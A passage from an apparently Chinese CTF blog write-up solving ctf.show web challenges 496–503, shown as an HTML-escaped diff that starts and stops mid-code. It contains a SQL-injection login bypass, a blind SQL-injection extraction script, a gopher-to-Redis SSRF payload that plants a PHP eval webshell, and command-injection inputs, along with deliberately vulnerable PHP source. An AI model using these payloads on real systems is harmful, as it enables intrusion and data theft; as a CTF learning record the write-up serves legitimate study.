+	&amp;#125;
+
+	public function __destruct()&amp;#123;
+		$this-&amp;gt;log-&amp;gt;log($this-&amp;gt;sql);
+	&amp;#125;
+&amp;#125;
+class dbLog&amp;#123;
+	public $sql;
+	public $content;
+	public $log;
+
+	public function __construct()&amp;#123;
+		$this-&amp;gt;log=&#39;log/&#39;.date_format(date_create(),&amp;quot;Y-m-d&amp;quot;).&#39;.txt&#39;;
+	&amp;#125;
+	public function log($sql)&amp;#123;
+		$this-&amp;gt;content = $this-&amp;gt;content.date_format(date_create(),&amp;quot;Y-m-d-H-i-s&amp;quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;
+	&amp;#125;
+	public function __destruct()&amp;#123;
+		file_put_contents($this-&amp;gt;log, $this-&amp;gt;content,FILE_APPEND);
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在 index 文件中，反序列化函数被注释了，很显然不在考察这个点，先万能密码登录&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;username=admin&#39;||1=1#&amp;amp;password=2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719203018518.png&#34; alt=&#34;image-20230719203018518&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;一通翻阅前台源码后，找到了这样一段内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719203309929.png&#34; alt=&#34;image-20230719203309929&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到有一个 api/admin_edit.php 文件，这里也通过任意文件读取拿到源码&lt;/p&gt;
+&lt;p&gt;../api/admin_edit&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+include(&#39;../render/db_class.php&#39;);
+
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+	extract($_POST);
+	$sql = &amp;quot;update user set nickname=&#39;&amp;quot;.substr($nickname, 0,8).&amp;quot;&#39; where username=&#39;&amp;quot;.$user[&#39;username&#39;].&amp;quot;&#39;&amp;quot;;
+	$db=new db();
+	if($db-&amp;gt;update_one($sql))&amp;#123;
+		$_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;
+		$ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
+	&amp;#125;else&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;
+	&amp;#125;
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里使用了 extract 函数，直接变量覆盖就行，接下来就是写脚本盲注拿到 flag&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+import time
+import random
+
+flag = &#39;&#39;
+url = &#39;http://1f1d5df2-bbb9-46c8-a739-70a05a6f25eb.challenge.ctf.show/api/admin_edit.php&#39;
+headers = &amp;#123;
+    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;,
+    &#39;Accept&#39;: &#39;application/json, text/javascript, */*; q=0.01&#39;,
+    &#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;,
+    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,
+    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded; charset=UTF-8&#39;,
+    &#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;,
+    &#39;Origin&#39;: &#39;http://1f1d5df2-bbb9-46c8-a739-70a05a6f25eb.challenge.ctf.show&#39;,
+    &#39;Referer&#39;: &#39;http://1f1d5df2-bbb9-46c8-a739-70a05a6f25eb.challenge.ctf.show/index.php?action=view&amp;amp;page=admin_profile_edit&#39;,
+    &#39;Connection&#39;: &#39;close&#39;,
+    &#39;Cookie&#39;: &#39;PHPSESSID=47ctj3k5luhunkvpaqmmoj2ca3; td_cookie=2201095133&#39;
+&amp;#125;
+
+for i in range(1,250):
+    time.sleep(0.04)
+    low = 32
+    high = 128
+    mid = (low+high)//2
+    while(low&amp;lt;high):
+        # payload = &amp;quot;user[username]=&#39;||ascii(substr((database()),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;#&amp;quot;.format(i,mid)
+        # payload = &amp;quot;user[username]=&#39;||ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;#&amp;quot;.format(i,mid)
+        # payload = &amp;quot;user[username]=&#39;||ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flagyoudontknow76&#39;),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;#&amp;quot;.format(i,mid)
+        payload = &amp;quot;user[username]=&#39;||ascii(substr((select group_concat(flagisherebutyouneverknow118) from flagyoudontknow76),&amp;#123;0&amp;#125;,1))&amp;gt;&amp;#123;1&amp;#125;#&amp;quot;.format(i,mid)
+
+        data = &amp;#123;
+            &#39;user[username]&#39;: payload,
+            &#39;nickname&#39;: random.randint(1,10000)
+        &amp;#125;
+        r = requests.post(url=url,headers=headers,data=data)
+        # print(r.text)
+        # print(data)
+        time.sleep(0.04)
+        if &amp;quot;u529f&amp;quot;  in r.text:#二分法
+            low = mid+1
+        else:
+            high = mid
+        mid = (low+high)//2
+    if(mid ==32 or mid ==127):
+        break
+    flag = flag+chr(mid)
+    print(flag)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;web497&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web497&#34;&gt;#&lt;/a&gt; Web497&lt;/h2&gt;
+&lt;p&gt;这题就比较快了，先用万能密码登录，然后在修改头像的地方&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719211517584.png&#34; alt=&#34;image-20230719211517584&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里可以直接读取 flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719211641946.png&#34; alt=&#34;image-20230719211641946&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;解码就行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719211620060.png&#34; alt=&#34;image-20230719211620060&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里贴一下源码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.php&#39;);
+		$cache=templateUtil::shade($templateContent,$arg);
+		echo $cache;
+	&amp;#125;
+	public static  function shade($templateContent,$arg=array())&amp;#123;
+		$templateContent=templateUtil::checkImage($templateContent,$arg);
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkImage($templateContent,$arg=array())&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				$encode=&#39;&#39;;
+				if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&amp;#123;
+					$encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));
+				&amp;#125;else&amp;#123;
+					$ch=curl_init($value);
+					curl_setopt($ch, CURLOPT_HEADER, 0);
+					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+					$result=curl_exec($ch);
+					curl_close($ch);
+					$ret=chunk_split(base64_encode($result));
+					$encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;
+					file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);
+				&amp;#125;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $encode, $templateContent);
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;../api/admin_edit&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+include(&#39;../render/db_class.php&#39;);
+
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+	extract($_POST);
+	$user= $_SESSION[&#39;user&#39;];
+	if(preg_match(&#39;/\&#39;|\&amp;quot;|\\\/&#39;, $avatar))&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;存在无效字符&#39;;
+		die(json_encode($ret));
+	&amp;#125;
+	$sql = &amp;quot;update user set nickname=&#39;&amp;quot;.substr($nickname, 0,8).&amp;quot;&#39;,avatar=&#39;&amp;quot;.$avatar.&amp;quot;&#39; where username=&#39;&amp;quot;.substr($user[&#39;username&#39;],0,8).&amp;quot;&#39;&amp;quot;;
+	$db=new db();
+	if($db-&amp;gt;update_one($sql))&amp;#123;
+		$_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;
+		$_SESSION[&#39;user&#39;][&#39;avatar&#39;]=$avatar;
+		$ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
+	&amp;#125;else&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;
+	&amp;#125;
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;web498&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web498&#34;&gt;#&lt;/a&gt; Web498&lt;/h2&gt;
+&lt;p&gt;还是上一题利用的点，但是这里离没法直接读取 flag，ssrf 打 redis&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720073256812.png&#34; alt=&#34;image-20230720073256812&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;将返回信息解码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720073325240.png&#34; alt=&#34;image-20230720073325240&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;很显然 6379 端口是开放的&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27zf%27%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;访问 shell.php 即可&lt;/p&gt;
+&lt;h2 id=&#34;web499&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web499&#34;&gt;#&lt;/a&gt; Web499&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720074314062.png&#34; alt=&#34;image-20230720074314062&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;okk，冲&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720074618647.png&#34; alt=&#34;image-20230720074618647&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里加了一个跳转链接&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720074514944.png&#34; alt=&#34;image-20230720074514944&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里有一个 api/admin_setting 文件，用之前的文件读取拿到这个文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+session_start();
+
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+	$config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings.php&#39;));
+	foreach ($_POST as $key =&amp;gt; $value) &amp;#123;
+		$config[$key]=$value;
+	&amp;#125;
+	file_put_contents(__DIR__.&#39;/../config/settings.php&#39;, serialize($config));
+	$ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个 if 中现将原有配置读取出来，然后用 post 传入的值替换，最后在序列化后存入 /../config/settings.php，这里将一句话写在配置文件中即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720075109785.png&#34; alt=&#34;image-20230720075109785&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里连接上看一下写入的内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720075242680.png&#34; alt=&#34;image-20230720075242680&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720080035295.png&#34; alt=&#34;image-20230720080035295&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web500&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web500&#34;&gt;#&lt;/a&gt; Web500&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720080315329.png&#34; alt=&#34;image-20230720080315329&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;又加了一个功能&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720080340629.png&#34; alt=&#34;image-20230720080340629&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;读取 api/admin_db_backup.php 文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
+&amp;lt;?php
+session_start();
+
+
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+	extract($_POST);
+	shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &amp;gt; &#39;.__DIR__.&#39;/../backup/&#39;.$db_path);
+
+
+	if(file_exists(__DIR__.&#39;/../backup/&#39;.$db_path))&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
+	&amp;#125;else&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
+	&amp;#125;
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里可以变量覆盖实现命令注入&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720081029783.png&#34; alt=&#34;image-20230720081029783&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720081829550.png&#34; alt=&#34;image-20230720081829550&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;访问 a.txt&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720081858552.png&#34; alt=&#34;image-20230720081858552&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web501&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web501&#34;&gt;#&lt;/a&gt; Web501&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720082005139.png&#34; alt=&#34;image-20230720082005139&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;没有什么新加入的模块，还是读取上一题数据库备份的文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+session_start();
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+	extract($_POST);
+
+	if(preg_match(&#39;/^zip|tar|sql$/&#39;, $db_format))&amp;#123;
+		shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &amp;gt; &#39;.__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;.&#39;.$db_format);
+		if(file_exists(__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;.&#39;.$db_format))&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
+		&amp;#125;else&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
+		&amp;#125;
+	&amp;#125;else&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
+	&amp;#125;
+	
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720082544640.png&#34; alt=&#34;image-20230720082544640&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;加了一点限制，但是不影响命令注入&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720083039564.png&#34; alt=&#34;image-20230720083039564&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720083022087.png&#34; alt=&#34;image-20230720083022087&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web502&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web502&#34;&gt;#&lt;/a&gt; Web502&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720083235919.png&#34; alt=&#34;image-20230720083235919&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;没新东西，还是读数据库备份的文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+
+include(&#39;../render/db_class.php&#39;);
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$pre=__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;/db.&#39;;
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+	extract($_POST);
+	if(file_exists($pre.$db_format))&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
+			die(json_encode($ret));
+	&amp;#125;
+	if(preg_match(&#39;/^(zip|tar|sql)$/&#39;, $db_format))&amp;#123;
+		shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &amp;gt; &#39;.$pre.$db_format);
+		if(file_exists($pre.$db_format))&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
+		&amp;#125;else&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
+		&amp;#125;
+	&amp;#125;else&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
+	&amp;#125;
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720083434171.png&#34; alt=&#34;image-20230720083434171&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;先判断传入的路径如果已经存在了就直接退出，但是不影响什么&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;db_format=zip&amp;amp;pre=1;cp+/f*+/var/www/html/a.txt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720083937161.png&#34; alt=&#34;image-20230720083937161&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720084001460.png&#34; alt=&#34;image-20230720084001460&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web503&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web503&#34;&gt;#&lt;/a&gt; Web503&lt;/h2&gt;
+&lt;p&gt;还读备份文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+
+include(&#39;../render/db_class.php&#39;);
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$pre=__DIR__.&#39;/../backup/&#39;.date_format(date_create(),&#39;Y-m-d&#39;).&#39;/db.&#39;;
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+	extract($_POST);
+	if(file_exists($pre.$db_format))&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
+			die(json_encode($ret));
+	&amp;#125;
+
+	if(preg_match(&#39;/^(zip|tar|sql)$/&#39;, $db_format))&amp;#123;
+		shell_exec(&#39;mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &amp;gt; &#39;.md5($pre.$db_format));
+		if(file_exists($pre.$db_format))&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;数据库备份成功&#39;;
+		&amp;#125;else&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
+		&amp;#125;
+	&amp;#125;else&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;数据库备份失败&#39;;
+	&amp;#125;
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里 MD5 包裹，确实没啥好办法利用了，又回头看写好的两个模块，发现配置这个地方多了一点东西&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720090034143.png&#34; alt=&#34;image-20230720090034143&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;果然也是发现了一个新的文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720090143342.png&#34; alt=&#34;image-20230720090143342&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+	$arr = $_FILES[&amp;quot;file&amp;quot;];
+	if(($arr[&amp;quot;type&amp;quot;]==&amp;quot;image/jpeg&amp;quot; || $arr[&amp;quot;type&amp;quot;]==&amp;quot;image/png&amp;quot; ) &amp;amp;&amp;amp; $arr[&amp;quot;size&amp;quot;]&amp;lt;10241000 )
+	&amp;#123;
+		$arr[&amp;quot;tmp_name&amp;quot;];
+		$filename = md5($arr[&#39;name&#39;]);
+		$ext = pathinfo($arr[&#39;name&#39;],PATHINFO_EXTENSION);
+		if(!preg_match(&#39;/^php$/i&#39;, $ext))&amp;#123;
+			$basename = &amp;quot;../img/&amp;quot;.$filename.&#39;.&#39; . $ext;
+			move_uploaded_file($arr[&amp;quot;tmp_name&amp;quot;],$basename);
+			$config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
+			$config[&#39;logo&#39;]=$filename.&#39;.&#39; . $ext;
+			file_put_contents(__DIR__.&#39;/../config/settings&#39;, serialize($config));
+			$ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;
+		&amp;#125;
+		
+	&amp;#125;else&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
+	&amp;#125;
+	
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里可以文件上传，限制也不多，可以上传一个 phar 文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720090806925.png&#34; alt=&#34;image-20230720090806925&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;通过这个 file_exists 触发到达反序列化的目的，通过下面的 dblog 来写马&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+error_reporting(0);
+class db&amp;#123;
+	
+	public $db;
+	public $log;
+	public $sql;
+	public $username=&#39;root&#39;;
+	public $password=&#39;root&#39;;
+	public $port=&#39;3306&#39;;
+	public $addr=&#39;127.0.0.1&#39;;
+	public $database=&#39;ctfshow&#39;;
+	public function __construct()&amp;#123;
+		$this-&amp;gt;log=new dbLog();
+		$this-&amp;gt;db=$this-&amp;gt;getConnection();
+	&amp;#125;
+
+	public function getConnection()&amp;#123;
+		 
+		return new mysqli($this-&amp;gt;addr,$this-&amp;gt;username,$this-&amp;gt;password,$this-&amp;gt;database);
+	&amp;#125;
+
+	public  function select_one($sql)&amp;#123;
+		$this-&amp;gt;sql=$sql;
+		$result=$this-&amp;gt;db-&amp;gt;query($sql);
+		if($result)&amp;#123;
+			return $result-&amp;gt;fetch_object();
+		&amp;#125;
+
+	&amp;#125;
+	public  function select_one_array($sql)&amp;#123;
+		$this-&amp;gt;sql=$sql;
+		$conn = db::getConnection();
+		$result=$this-&amp;gt;db-&amp;gt;query($sql);
+		if($result)&amp;#123;
